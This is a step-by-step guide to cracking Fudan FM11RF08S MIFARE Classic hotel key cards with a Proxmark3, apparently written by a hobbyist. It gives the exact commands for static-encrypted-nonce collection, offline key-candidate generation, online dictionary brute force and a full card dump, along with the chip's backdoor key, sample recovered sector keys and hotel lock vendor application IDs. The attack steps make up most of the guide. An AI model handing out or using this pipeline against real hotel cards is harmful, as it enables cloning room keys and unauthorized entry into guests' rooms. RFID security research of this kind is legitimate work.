# Cracking FM11RF08S Hotel Cards with Proxmark3

A step-by-step guide for recovering all sector keys from Fudan FM11RF08S MIFARE Classic 1K cards when standard attacks fail.

## Background

The FM11RF08S is a Chinese clone of the NXP MIFARE Classic 1K. Hotels use them because they're cheap. The chip has a well-documented backdoor (see [Doegox's paper](https://eprint.iacr.org/2024/1275)) and a quirk that breaks every standard Proxmark3 attack: its first-auth nonce behaves like a weak PRNG, but its nested-auth nonce is **static and encrypted**. This causes:

- `hf mf nested` → "PRNG is not predictable" (checks first nonce, sees it changing unpredictably)
- `hf mf staticnested` → "Normal nonce detected" (also checks first nonce, doesn't see static behavior)
- `hf mf hardnested` → "Static encrypted nonce detected. Aborted" (hits the static nested nonce)

None of these handle the hybrid correctly. The official recovery script (`fm11rf08s_recovery.py`) is supposed to automate the process, but it has a long history of breakage across platforms — missing Python SWIG bindings, hardcoded tool paths, Unicode crashes, and backdoor auth failures are all documented in the Iceman repo (see [Known Issues](#known-issues-in-the-iceman-repo) below).

This guide documents a **manual pipeline** that bypasses all of those failure points using `hf mf isen` for nonce collection, offline cracking tools, and dictionary brute force. It works reliably where the script doesn't.

## Requirements

- **Proxmark3 RDV4** (or compatible) with Iceman firmware
- Card on the reader for the duration
- At least **one known sector key** (autopwn usually finds several via dictionary)
- The `staticnested_1nt` and `staticnested_2x1nt_rf08s` offline tools (included with Iceman firmware, typically at `/usr/local/share/proxmark3/tools/`)

## Step 1: Identify the Card

```
hf 14a reader
```

Note the UID (you'll need it for offline cracking). Confirm it reads cleanly — if you see "Multiple tags detected" or BCC errors, remove all other NFC devices from the field.

Then:

```
hf mf info
```

Look for:
```
[+] Fudan FM11RF08S 0490
[+] Prng....... weak
[+] Static enc nonce... yes
```

If you see this, you have an FM11RF08S. The output will also show the backdoor key (typically `A396EFA4E24F`).

> **Note:** The backdoor key uses a special authentication protocol. It does NOT work as a regular sector key — don't waste time trying `hf mf rdbl -k A396EFA4E24F`.

## Step 2: Run Autopwn for Known Keys

```
hf mf autopwn
```

This will find keys via dictionary for most sectors. Hotel cards commonly use:
- `A0A1A2A3A4A5` (MAD key)
- `FFFFFFFFFFFF` (transport default)
- Various vendor-specific keys

Write down which sectors remain **unsolved** (shown as `------------ | 0` in the results table). These are your targets.

## Step 3: Collect Static Encrypted Nonces

Using any known key (sector 0 Key A is usually the easiest):

```
hf mf isen --collect_fm11rf08s_without_backdoor --blk 0 -a -k <KNOWN_KEY> -f /tmp/fm11_<UID>
```

Example:
```
hf mf isen --collect_fm11rf08s_without_backdoor --blk 0 -a -k A0A1A2A3A4A5 -f /tmp/fm11_FED093E1
```

This takes about 500ms and saves a JSON file containing the static encrypted nonce (`nt_enc`), plaintext nonce (`nt`), and parity errors (`par_err`) for every sector and key type (A/B), plus the backdoor sector 32.

> **If this fails with "Auth1 error":** The card may have moved. Run `hf 14a reader` to confirm it's still on the antenna, then retry.

### Understanding the Nonce Data

Open the JSON file and look at the `nt` values. If a sector has **identical** `nt.a` and `nt.b` values, Key A and Key B are the same for that sector. Different values mean different keys that each need cracking separately.

## Step 4: Generate Key Candidates (Offline)

For each **unknown** key, run the offline cracker. The tool location is typically:
```
/usr/local/share/proxmark3/tools/staticnested_1nt
```

Syntax:
```
staticnested_1nt <UID> <SECTOR> <nt> <nt_enc> <par_err>
```

Pull the values from your JSON file. Example for sector 1 Key A:
```
/usr/local/share/proxmark3/tools/staticnested_1nt FED093E1 1 573B3263 C2BCB6D5 1000
```

This generates a dictionary file in the current directory named `keys_<uid>_<sector>_<nt>.dic` containing tens of thousands of candidate keys.

### Cross-Reference (Optional but Recommended)

If you cracked candidates for **both** Key A and Key B of the same sector, cross-reference them to reduce the candidate count:

```
/usr/local/share/proxmark3/tools/staticnested_2x1nt_rf08s keys_<uid>_<sector>_<ntA>.dic keys_<uid>_<sector>_<ntB>.dic
```

This produces `_filtered.dic` files with significantly fewer candidates.

## Step 5: Brute Force Against the Card

Feed the candidate dictionary back to the Proxmark3:

```
hf mf fchk --blk <FIRST_BLOCK_OF_SECTOR> -a -f keys_<uid>_<sector>_<nt>_filtered.dic
```

Block numbers: sector × 4. So sector 1 = block 4, sector 6 = block 24, etc.

For Key B, use `-b` instead of `-a`:
```
hf mf fchk --blk <BLOCK> -b -f keys_<uid>_<sector>_<nt>_filtered.dic
```

The PM3 tests approximately 85 keys/second. With 10K-15K filtered candidates, expect **1-3 minutes per key**.

Repeat for every unknown key.

## Step 6: Full Dump

Once all keys are known, create a text file with every unique key (one per line):

```
cat > /tmp/all_keys.dic << 'EOF'
A0A1A2A3A4A5
B578F38A5C61
BE06F0345308
465C70A57077
0000014B5C31
38690062A482
FFFFFFFFFFFF
EOF
```

Then dump:
```
hf mf autopwn --1k -f /tmp/all_keys.dic
```

This will authenticate every sector with the correct key, dump all data, and save `.json`, `.bin`, and `.key.bin` files.

## Step 7: Analyze the Dump

Check the MAD (MIFARE Application Directory) to identify what systems are on the card:

```
hf mf mad -k A0A1A2A3A4A5
```

Common hotel MAD application IDs:
| AID | System | Vendor |
|-----|--------|--------|
| 7005 | Energy Saving (room power slot) | ENKOA System |
| 7006 | Hotel access control (publisher) | Vingcard / ASSA ABLOY |
| 7007 | Hotel access control & security | Vingcard / ASSA ABLOY |
| 7009 | Electronic lock access data | Timelox AB |

## Why Not Just Use the Recovery Script?

The Iceman firmware includes `fm11rf08s_recovery.py` (by Doegox) which automates this entire process. In theory, you just run `script run fm11rf08s_recovery` and it handles everything. In practice, it may break:

- **Python3 support** — The script requires a Proxmark3 installation built with Python3 support. Some installations (especially Homebrew on macOS) don't build it. You get `ModuleNotFoundError: No module named '_pm3'` or a `SIGTRAP` crash.
- **Backdoor auth failures** — `--collect_fm11rf08s` uses the backdoor key for initial auth. On some FM11RF08S variants, the backdoor auth command fails silently, returning all zeros. The `--collect_fm11rf08s_without_backdoor` flag was added as a workaround.

There's also an open feature request ([#2565](https://github.com/RfidResearchGroup/proxmark3/issues/2565)) asking `autopwn` to detect FM11RF08S cards and suggest the recovery script automatically, instead of just failing with contradictory error messages. As of this writing, `autopwn` still gives no guidance when it hits the static nonce wall.

The manual pipeline in this guide does exactly what the script does, but each step is a standalone command that works independently. If one step fails, you can debug it in isolation rather than digging through Python stack traces.

## Troubleshooting

### "Multiple tags detected. Collision after Bit 32"
Another NFC device is in the field. Remove phones, wallets, other cards. The PM3 antenna is sensitive — even an NFC-enabled phone a few inches away can cause collisions.

### fm11rf08s_recovery.py crashes with SIGTRAP or "No module named '_pm3'"
The Python SWIG bindings weren't compiled during the PM3 build. This is common on macOS (Homebrew) and some Linux distros. Use the manual pipeline described above instead — it does the same thing without the Python dependency.

### "Auth1 error" on isen --collect_fm11rf08s
The **backdoor auth command** isn't working. This is a [known issue](https://github.com/RfidResearchGroup/proxmark3/issues/2553) — some FM11RF08S variants don't respond to the backdoor protocol, or the backdoor key is different from the default `A396EFA4E24F`. Use `--collect_fm11rf08s_without_backdoor` with a known key instead (requires `--blk` and `-a`/`-b` flags).

### Sector reads fail with "Cmd Error 04" even with the correct key
Check the access bits. Some sectors are configured so Key A can authenticate but NOT read data blocks. Try reading with Key B instead:
```
hf mf rdsc -s <SECTOR> -k <KEY_B> -b
```

### staticnested_1nt returns "failed to change user ID"
This happens when the shell expands a variable that looks like a UID flag. Use the hex values directly without shell variables, or quote them.

### staticnested_1nt or staticnested_2x1nt_rf08s not found
The offline tools are installed separately from the PM3 client. Check:
```
find /usr/local -name "staticnested_1nt" 2>/dev/null
find /usr/share -name "staticnested_1nt" 2>/dev/null
```
Common locations: `/usr/local/share/proxmark3/tools/` or `/usr/share/proxmark3/tools/`. If missing, rebuild PM3 from source — the tools are compiled as part of the standard build.

## Timing Expectations

| Step | Duration |
|------|----------|
| Card identification | 2 seconds |
| Autopwn (dictionary) | 10-30 seconds |
| Nonce collection | <1 second |
| Offline candidate generation (per key) | 1-5 seconds |
| Cross-reference filtering | <1 second |
| Online brute force (per key) | 1-3 minutes |
| Full dump with all keys | 10-15 seconds |
| **Total for 3 unknown keys** | **~15 minutes** |

